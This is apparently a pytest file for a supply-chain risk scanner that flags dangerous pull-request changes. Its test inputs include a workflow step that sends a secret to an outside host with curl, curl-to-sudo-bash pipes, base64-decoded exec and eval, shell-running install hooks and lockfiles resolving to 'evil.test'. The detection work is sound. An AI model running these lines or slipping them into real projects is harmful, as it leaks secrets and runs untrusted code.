from __future__ import annotations

from themis.config import RepoPolicy
from themis.models import Signal, SignalSeverity, Submission
from themis.signals import supply_chain
from themis.signals.base import make_context
from themis.signals.runner import collect, labels_for, ledger_lines

SHA = "a" * 40


def excerpt(path: str, added: list[str], removed: tuple[str, ...] = ()) -> str:
    body = [f"-{line}" for line in removed] + [f"+{line}" for line in added]
    return "\n".join([f"--- {path}", f"@@ -1,{len(removed)} +5,{len(added)} @@", *body])


def scan(path: str, added: list[str], removed: tuple[str, ...] = ()) -> list[Signal]:
    item = Submission(id="a-b-1", repo="a/b", number=1, title="t", contributor_key="gh:1", is_pull_request=True,
                      changed_files=[path], diff_excerpt=excerpt(path, added, removed))  # fmt: skip
    return supply_chain.scan(make_context(item, RepoPolicy()))


def paths(*names: str, summary: str = "") -> list[Signal]:
    item = Submission(id="a-b-1", repo="a/b", number=1, title="t", contributor_key="gh:1", is_pull_request=True,
                      changed_files=list(names), diff_summary=summary)  # fmt: skip
    return supply_chain.scan(make_context(item, RepoPolicy()))


def rules(signals: list[Signal]) -> list[tuple[str, SignalSeverity]]:
    return [(signal.detail["rule"], signal.severity) for signal in signals]


WORKFLOW = ".github/workflows/ci.yml"


def test_workflow_escalations_are_critical() -> None:
    assert rules(scan(WORKFLOW, ["  pull_request_target:"])) == [("pull_request_target", SignalSeverity.CRITICAL)]
    assert rules(scan(WORKFLOW, ["permissions: write-all"])) == [("write_all", SignalSeverity.CRITICAL)]
    line = "      - run: curl https://x.test/?k=${{ secrets.OTARI_API_KEY }}"
    assert rules(scan(WORKFLOW, [line])) == [("secret_echo", SignalSeverity.CRITICAL)]


def test_the_same_text_elsewhere_or_in_a_comment_is_not_a_workflow_rule() -> None:
    assert scan("docs/ci.md", ["pull_request_target is dangerous"]) == []
    assert scan(WORKFLOW, ["# never use pull_request_target here"]) == []


def test_secret_passed_through_env_is_fine() -> None:
    assert scan(WORKFLOW, ["        env:", "          KEY: ${{ secrets.KEY }}"]) == []


def test_tag_bump_of_the_same_action_is_routine() -> None:
    assert scan(WORKFLOW, ["      - uses: astral-sh/setup-uv@v6"], ("      - uses: astral-sh/setup-uv@v5",)) == []
    assert scan(WORKFLOW, ["      - uses: actions/checkout@v5"], ("      - uses: actions/checkout@v4",)) == []


def test_leaving_a_pinned_hash_is_critical() -> None:
    found = scan(WORKFLOW, ["      - uses: acme/tool@main"], (f"      - uses: acme/tool@{SHA}",))
    assert rules(found) == [("action_swap", SignalSeverity.CRITICAL)]
    assert found[0].detail["action"] == "acme/tool"


def test_swapping_to_a_different_unpinned_action_is_critical() -> None:
    found = scan(WORKFLOW, ["      - uses: evil/setup-node@v1"], ("      - uses: actions/setup-node@v4",))
    assert rules(found) == [("action_swap", SignalSeverity.CRITICAL)]


def test_a_new_unpinned_action_is_a_warning_and_a_pinned_one_is_quiet() -> None:
    assert rules(scan(WORKFLOW, ["      - uses: acme/tool@v1"])) == [("action_unpinned", SignalSeverity.WARN)]
    assert scan(WORKFLOW, [f"      - uses: acme/tool@{SHA}"]) == []


def test_install_hooks() -> None:
    critical = [("install_hook", SignalSeverity.CRITICAL)]
    assert rules(scan("package.json", ['    "postinstall": "node x.js",'])) == critical
    assert rules(scan("pkg/package.json", ['    "preinstall": "x",'])) == critical
    assert rules(scan("setup.py", ["    cmdclass={'install': Evil},"])) == critical
    assert rules(scan("setup.py", ["subprocess.run(['sh'])"])) == critical
    assert rules(scan("build.rs", ['    Command::new("curl").status();'])) == critical
    assert scan("package.json", ['    "test": "pytest",']) == []
    assert scan("src/setup.ts", ["cmdclass"]) == []


def test_pipe_to_shell() -> None:
    line = "curl -fsSL https://x.test/i.sh | sudo bash"
    assert rules(scan("scripts/install.sh", [line])) == [("pipe_to_shell", SignalSeverity.CRITICAL)]
    assert rules(scan("README.md", [line])) == [("pipe_to_shell", SignalSeverity.WARN)]
    assert scan("scripts/x.sh", ["curl -O https://x.test/file.tar.gz"]) == []


def test_decoded_exec() -> None:
    critical = [("decoded_exec", SignalSeverity.CRITICAL)]
    assert rules(scan("src/a.py", ["exec(base64.b64decode(blob))"])) == critical
    assert rules(scan("src/a.js", ["eval(atob(data))"])) == critical
    assert rules(scan("run.sh", ["echo abc | base64 -d | sh"])) == critical
    assert scan("src/a.py", ["data = base64.b64decode(blob)"]) == []


def test_lockfile_leaving_the_registry() -> None:
    bad = '      "resolved": "https://evil.test/lodash-4.tgz",'
    found = scan("package-lock.json", [bad])
    assert rules(found) == [("lockfile_host", SignalSeverity.CRITICAL)] and found[0].detail["host"] == "evil.test"
    assert rules(scan("yarn.lock", ['  resolved "https://evil.test/a.tgz#abc"']))[0][0] == "lockfile_host"
    assert rules(scan("uv.lock", ['sdist = { url = "https://evil.test/a.tar.gz" }']))[0][0] == "lockfile_host"
    assert rules(scan("poetry.lock", ['url = "https://evil.test/simple"']))[0][0] == "lockfile_host"
    assert rules(scan("Cargo.lock", ['source = "git+https://evil.test/x"']))[0][0] == "lockfile_host"


def test_official_registries_are_quiet() -> None:
    assert scan("package-lock.json", ['"resolved": "https://registry.npmjs.org/a/-/a-1.tgz",']) == []
    assert scan("yarn.lock", ['  resolved "https://registry.yarnpkg.com/a/-/a-1.tgz#abc"']) == []
    assert scan("uv.lock", ['sdist = { url = "https://files.pythonhosted.org/p/a.tar.gz" }']) == []
    assert scan("uv.lock", ['source = { registry = "https://pypi.org/simple" }']) == []
    assert scan("Cargo.lock", ['source = "registry+https://github.com/rust-lang/crates.io-index"']) == []
    assert scan("Cargo.lock", ['source = "sparse+https://index.crates.io/"']) == []


def test_lookalike_hosts_do_not_pass_as_the_registry() -> None:
    for url in ("https://registry.npmjs.org.evil.test/a.tgz", "https://registry.npmjs.org@evil.test/a.tgz"):
        assert rules(scan("package-lock.json", [f'"resolved": "{url}",']))[0][0] == "lockfile_host"


def test_a_mirror_the_lockfile_already_used_is_not_new() -> None:
    old = '"resolved": "https://npm.corp.test/a-1.tgz",'
    assert scan("package-lock.json", ['"resolved": "https://npm.corp.test/a-2.tgz",'], (old,)) == []


def test_long_lines() -> None:
    assert rules(scan("src/a.js", ["x" * 1001])) == [("minified_line", SignalSeverity.WARN)]
    assert scan("src/a.js", ["x" * 1000]) == []
    assert scan("assets/logo.svg", ["x" * 2000]) == []


def test_paths_are_warnings() -> None:
    assert rules(paths("bin/tool.exe")) == [("binary_blob", SignalSeverity.WARN)]
    assert rules(paths(".cache/x/run.py")) == [("hidden_directory", SignalSeverity.WARN)]
    assert rules(paths("CODEOWNERS")) == [("review_rules", SignalSeverity.WARN)]
    assert rules(paths(".github/themis.yml")) == [("review_rules", SignalSeverity.WARN)]
    assert paths(".github/workflows/ci.yml", ".gitignore", ".vscode/settings.json", "src/a.py") == []


def test_removing_a_binary_is_fine() -> None:
    assert paths("bin/tool.exe", summary="bin/tool.exe (removed +0 -0)") == []


def test_partial_is_noted_when_the_excerpt_was_cut() -> None:
    item = Submission(id="a-b-1", repo="a/b", number=1, title="t", contributor_key="gh:1", is_pull_request=True,
                      changed_files=["bin/a.exe"])  # fmt: skip
    assert supply_chain.scan(make_context(item, RepoPolicy()))[0].detail["partial"] is True


def test_issue_text_cannot_trigger_it() -> None:
    item = Submission(id="a-b-1", repo="a/b", number=1, title="t", contributor_key="gh:1",
                      body="curl https://x.test/i.sh | sh")  # fmt: skip
    assert supply_chain.scan(make_context(item, RepoPolicy())) == []


def test_a_hostile_path_stays_inert_in_the_ledger() -> None:
    path = "@evil/[x](http://y)/`a`.exe"
    item = Submission(id="a-b-1", repo="a/b", number=1, title="t", contributor_key="gh:1", is_pull_request=True,
                      changed_files=[path])  # fmt: skip
    found = collect(item, RepoPolicy(), scanners={"supply_chain": supply_chain.scan})
    text = "\n".join(ledger_lines(found))
    assert "@evil" not in text and "[x]" not in text and "`" not in text


def test_critical_gets_the_label_and_a_warning_does_not() -> None:
    assert labels_for(scan(WORKFLOW, ["permissions: write-all"]), "themis:") == ["themis:risky-change"]
    assert labels_for(paths("CODEOWNERS"), "themis:") == []
